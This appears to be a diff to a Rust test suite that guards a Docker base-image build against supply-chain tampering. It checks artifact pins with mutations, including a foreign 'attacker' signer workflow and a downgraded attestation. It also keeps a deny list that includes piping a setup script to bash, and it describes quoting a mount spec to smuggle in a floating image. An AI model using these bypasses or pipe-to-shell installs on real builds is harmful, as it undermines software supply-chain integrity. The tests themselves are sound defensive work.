+            rows.push((
+                "attestation method downgraded".to_owned(),
+                "\"method\": \"sigstore-attestation\"".to_owned(),
+                "\"method\": \"hash-only\"".to_owned(),
+                "sigstore-attestation",
+            ));
+            rows.push((
+                "foreign signer workflow".to_owned(),
+                "cli/cli/.github/workflows/deployment.yml".to_owned(),
+                "attacker/cli/.github/workflows/deployment.yml".to_owned(),
+                "gh policy signer_workflow must be",
+            ));
+            rows.push((
+                "self-hosted runners accepted".to_owned(),
+                "\"deny_self_hosted_runners\": true".to_owned(),
+                "\"deny_self_hosted_runners\": false".to_owned(),
+                "deny self-hosted runners",
+            ));
+            rows.push((
+                "bundle path renamed".to_owned(),
+                format!("\"path\": \"{}\"", bundle.0),
+                "\"path\": \"gh-bundle.jsonl\"".to_owned(),
+                "bundle must be",
+            ));
+            rows.push((
+                "bundle digest upper-cased".to_owned(),
+                format!("\"sha256\": \"{}\"", bundle.1),
+                format!("\"sha256\": \"{}\"", bundle.1.to_uppercase()),
+                "bundle sha256 must be a lower-case SHA-256",
+            ));
+        }
+        let mut applied = 0;
+        for (label, from, to, needle) in rows {
+            let edited = source.replacen(&from, &to, 1);
+            if edited == source {
+                panic!("{name}: {label}: mutation did not apply");
+            }
+            let error = parse_artifact_pin(name, &edited)
+                .expect_err(&format!("{name}: accepted a pin mutation: {label}"));
+            assert!(
+                error.contains(needle),
+                "{name}: {label}: the refusal does not name the rule ({needle}): {error}"
+            );
+            applied += 1;
+        }
+        assert!(applied >= 16, "{name}: the mutation table stays broad");
+    }
+}
+
+#[test]
+fn the_base_recipe_installs_the_pinned_artifacts_through_the_installer() {
+    let base = read_text("images/Dockerfile");
+    let run = artifact_install_run(&base).expect("the base recipe installs both artifacts");
+    assert!(
+        run.contains("$TARGETARCH"),
+        "the arch token comes from the build"
+    );
+    assert!(
+        base.lines().any(|line| line.trim() == "ARG TARGETARCH"),
+        "the base stage must declare TARGETARCH"
+    );
+    for (name, path) in ARTIFACT_PINS {
+        let pin = parse_artifact_pin(name, &read_text(path)).unwrap();
+        assert_eq!(
+            label_value(&base, &format!("{ARTIFACT_LABEL_PREFIX}{name}")),
+            pin.version,
+            "{name}: the label must equal the pin"
+        );
+    }
+    // The removed instructions are gone in every spelling, and the base no
+    // longer fetches a third-party keyring, writes an apt source or pipes a
+    // setup script into a shell.
+    for needle in [
+        "nodesource",
+        "setup_22.x",
+        "cli.github.com",
+        "githubcli-archive-keyring",
+        "sources.list.d/github-cli",
+        "| bash",
+    ] {
+        assert!(
+            !base.to_lowercase().contains(&needle.to_lowercase()),
+            "images/Dockerfile still contains {needle}"
+        );
+    }
+    let installer_mount = "--mount=type=bind,source=install-artifact.sh,target=/tmp/artifact-source/install-artifact.sh,ro \\\n";
+    let mutations: Vec<(&str, String)> = vec![
+        ("installer mount removed", base.replace(installer_mount, "")),
+        (
+            "pin mount removed",
+            base.replace(
+                "    --mount=type=bind,source=artifacts,target=/tmp/artifact-source/artifacts,ro \\\n",
+                "",
+            ),
+        ),
+        (
+            "artifact pinned to one architecture",
+            base.replace(
+                "artifacts/gh.json \"$TARGETARCH\"",
+                "artifacts/gh.json \"amd64\"",
+            ),
+        ),
+        (
+            "pin read from outside the mounts",
+            base.replace(
+                "artifacts/node.json \"$TARGETARCH\"",
+                "/tmp/node.json \"$TARGETARCH\"",
+            ),
+        ),
+        (
+            "one artifact dropped",
+            base.replace("install-artifact.sh gh \\\n", "install-artifact.sh tool \\\n"),
+        ),
+    ];
+    for (label, edited) in mutations {
+        if edited == base {
+            panic!("the recipe mutation did not apply: {label}");
+        }
+        assert!(
+            artifact_install_run(&edited).is_err(),
+            "accepted a recipe mutation: {label}"
+        );
+    }
 }
 
 fn edited_recipe(
@@ -3911,10 +5329,12 @@ fn no_build_path_refreshes_parent_pins() {
 const BASE_INPUT_MANIFEST: &str = "images/base-inputs.sha256";
 /// The canonical root list, also declared by `script/build/base-inputs.sh`
 /// (`generated_base_input_roots` proves the two agree).
-const BASE_INPUT_ROOTS: [&str; 9] = [
+const BASE_INPUT_ROOTS: [&str; 11] = [
     ".dockerignore",
     "Dockerfile",
     "apt-policy",
+    "artifacts",
+    "install-artifact.sh",
     "install-build-ca.sh",
     "install-pnpm.sh",
     "install-zellij.sh",
@@ -4085,7 +5505,7 @@ fn mount_specs(instruction: &str) -> Vec<String> {
         .split_whitespace()
         .skip(1)
         .filter_map(|token| token.strip_prefix("--mount="))
-        .map(str::to_owned)
+        .map(unquote_spec)
         .collect()
 }
 
@@ -4094,8 +5514,21 @@ fn leading_mount_specs(instruction: &str) -> Vec<String> {
         .split_whitespace()
         .skip(1)
         .take_while(|token| token.starts_with("--mount="))
-        .map(|token| token["--mount=".len()..].to_owned())
+        .map(|token| unquote_spec(&token["--mount=".len()..]))
         .collect()
+}
+
+/// BuildKit unquotes a flag value, so `--mount='from=node:22,...'` is the same
+/// mount as the bare spelling. Splitting the raw token instead yields the field
+/// name `'from`, which no reference check recognizes, so the quote was a way to
+/// smuggle a floating image past this gate (#96 review).
+fn unquote_spec(value: &str) -> String {
+    for quote in ['\'', '"'] {
+        if value.len() >= 2 && value.starts_with(quote) && value.ends_with(quote) {
+            return value[1..value.len() - 1].to_owned();
+        }
+    }
+    value.to_owned()
 }
 
 /// The context source a mount consumes, if any. A missing `type` is a context
@@ -4314,6 +5747,174 @@ fn check_base_context_sources(base: &str) -> Result<(), String> {
                 }
             }
             _ => {}
+        }
+    }
+    Ok(())
+}
+
+/// The external image an instruction copies or mounts from, if any.
+fn image_input_references(instruction: &str) -> Vec<String> {
+    let mut references = Vec::new();
+    let upper = instruction.to_ascii_uppercase();
+    if upper.starts_with("COPY ") || upper.starts_with("ADD ") {
+        for token in instruction.split_whitespace().skip(1) {
+            if let Some(reference) = token.strip_prefix("--from=") {
+                references.push(reference.to_owned());
+            } else if !token.starts_with("--") {
+                break;
+            }
+        }
+    }
+    if upper.starts_with("RUN ") {
+        for spec in mount_specs(instruction) {
+            if let Some(reference) = mount_field(&spec, "from") {
+                references.push(reference);
+            } else if mount_field(&spec, "type").as_deref() == Some("image")
+                && let Some(source) =
+                    mount_field(&spec, "source").or_else(|| mount_field(&spec, "src"))
+            {
+                // A `type=image` mount takes an image reference in `source`
+                // rather than `from`; today's builder rejects the mount type,
+                // but a frontend bump would make it a way in.
+                references.push(source);
+            }
+        }
+    }
+    references
+}
+
+/// A `--from` reference has to be a reviewed input: a stage declared in this
+/// recipe, a stage index, or a parent image whose digest is in the inventory.
+///
+/// `COPY --from=node:22 /usr/local/ /usr/local/` and
+/// `RUN --mount=from=node:22,...` both passed every other guard while replacing
+/// the pinned Node with a floating image's copy (#96 review).
+fn check_image_reference(
+    path: &str,
+    reference: &str,
+    stages: &BTreeSet<String>,
+    stage_count: usize,
+    known: &BTreeSet<String>,
+) -> Result<(), String> {
+    if stages.contains(&reference.to_ascii_lowercase()) {
+        return Ok(());
+    }
+    if let Ok(index) = reference.parse::<usize>()
+        && index < stage_count
+    {
+        return Ok(());
+    }
+    if let Some((_, digest)) = reference.split_once("@sha256:") {
+        if known.contains(&format!("sha256:{digest}")) {
+            return Ok(());
+        }
+        return Err(format!(
+            "{path}: --from={reference} names a digest that is not in {PARENT_INVENTORY}"
+        ));
+    }
+    Err(format!(
+        "{path}: --from={reference} must name a stage declared in this recipe or a parent \
+         image pinned by digest in {PARENT_INVENTORY} (#96)"
+    ))
+}
+
+fn check_image_inputs(
+    recipes: &BTreeMap<String, String>,
+    inventory: &ParentInventory,
+) -> Result<(), String> {
+    let known: BTreeSet<String> = inventory
+        .pins
+        .values()
+        .map(|pin| pin.reference().digest.value().to_owned())
+        .collect();
+    for (path, source) in recipes {
+        let froms = parse_froms(source)?;
+        let stages: BTreeSet<String> = froms
+            .iter()
+            .filter_map(|from| from.stage.as_deref())
+            .map(str::to_ascii_lowercase)
+            .collect();
+        for instruction in dockerfile_instructions(source) {
+            for reference in image_input_references(&instruction) {
+                check_image_reference(path, &reference, &stages, froms.len(), &known)?;
+            }
+        }
+    }
+    Ok(())
+}
+
+/// A package step is any `RUN` whose own words run apt.
+fn is_package_step(instruction: &str) -> bool {
+    instruction.starts_with("RUN ")
+        && instruction_commands(instruction).iter().any(|words| {
+            words
+                .first()
+                .is_some_and(|word| APT_PROGRAMS.contains(&word.rsplit('/').next().unwrap_or(word)))
+        })
+}
+
+/// The base recipe has to check the inherited apt baseline *before* any package
+/// step and the final source set *after* the last one (#96). Deleting either
+/// invocation used to leave the static gate green, so both call sites are
+/// required here: the baseline is only a baseline if it runs first.
+fn check_apt_baseline_brackets_build(base: &str) -> Result<(), String> {
+    let instructions = dockerfile_instructions(base);
+    let checks: Vec<usize> = instructions
+        .iter()
+        .enumerate()
+        .filter(|(_, instruction)| {
+            instruction.starts_with("RUN ") && instruction.contains("apt-policy/check-sources.sh")
+        })
+        .map(|(index, _)| index)
+        .collect();
+    if checks.len() < 2 {
+        return Err(format!(
+            "the base recipe must run images/apt-policy/check-sources.sh twice - on the \
+             inherited baseline before any package step and on the final source set before \
+             the identity stamp - found {} invocation(s) (#96)",
+            checks.len()
+        ));
+    }
+    let (first, last) = (checks[0], checks[checks.len() - 1]);
+    let steps: Vec<usize> = instructions
+        .iter()
+        .enumerate()
+        .filter(|(_, instruction)| is_package_step(instruction))
+        .map(|(index, _)| index)
+        .collect();
+    if let Some(step) = steps.first()
+        && first > *step
+    {
+        return Err(format!(
+            "the first images/apt-policy/check-sources.sh run must come before the first \
+             package step, found it after instruction {step}"
+        ));
+    }
+    if let Some(step) = steps.last()
+        && last < *step
+    {
+        return Err(format!(
+            "the final images/apt-policy/check-sources.sh run must come after the last \
+             package step, found it before instruction {step}"
+        ));
+    }
+    let Some(stamp) = instructions.iter().rposition(|instruction| {
+        instruction.starts_with("RUN ") && instruction.contains(BASE_VERIFIER)
+    }) else {
+        return Err("the base recipe has no identity stamp to bracket".into());
+    };
+    for (index, instruction) in instructions.iter().enumerate() {
+        if index <= last || index >= stamp {
+            continue;
+        }
+        if matches!(
+            instruction.split_whitespace().next(),
+            Some("RUN" | "COPY" | "ADD")
+        ) {
+            return Err(format!(
+                "only the identity stamp may follow the final \
+                 images/apt-policy/check-sources.sh run, found {instruction}"
+            ));
         }
     }
     Ok(())
